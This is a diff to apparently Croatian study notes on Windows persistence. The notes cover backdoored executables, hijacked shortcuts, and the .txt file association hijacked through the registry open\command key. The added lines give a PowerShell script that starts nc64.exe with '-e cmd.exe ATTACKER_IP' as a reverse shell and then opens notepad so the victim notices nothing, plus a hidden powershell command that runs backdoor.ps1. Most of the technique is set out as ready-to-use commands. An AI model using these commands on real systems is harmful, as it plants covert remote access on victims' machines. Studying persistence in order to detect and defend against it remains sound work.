@@ -10,9 +10,9 @@ Kada to izgeneriramo zamjenjujemo legitimnu putty datoteku sa puttyX.exe
 
 Mogli bi isto umjesto mjenjaja .exe datoteke promjeniti na što shourtcut pokazuje.
 To postizemo da shortcut za tipa chrome pokazuje na exploit i kada se klikne ne njega se pokrene exploit koji pokrece chrome
-Kako bi to napravili za kalkulator:
+Shortcut files:
 
-U c:\windows\system32 kreiramo novu ps1 (powershell) datoteku slicnog naziva kao kalkulator.exe
+U c:\windows\system32 kreiramo novu ps1 (powershell) datoteku slicnog naziva kao kalkulator.ps1
 On ce imati ovakav sadržaj:
 `
 Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
@@ -38,5 +38,15 @@ Name: (Default) Type: REG_SZ Data: txtfile
 
 ProgId (Programmic ID) je informacije u stupcu data, u nasem slucaju txtfile
 Pokusavamo pronaci taj ProgId u registriju (također je u direktoriju HKEY_Local_Machine\Software\Classes)
-Nakon sto ga pronademo, pokusavamo pronaci folder \command u njemu
+Nakon sto ga pronademo, pokusavamo pronaci folder \open\command u njemu
+Kada smo pronaslo open\command mjenjamo data polje koji pokazuje na program s kojom se otvara .txt file na nasu naredbu/exploit
 
+Primjer za notepad exploit datoteka:
+
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
+C:\Windows\system32\NOTEPAD.EXE $args[0]
+
+$args[0] je kliknuta .txt datoteka za otvaranje
+
+I opet stavljamo u data polje naredbu koja pokazuje na nasu ps1 skriptu:
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1 %1
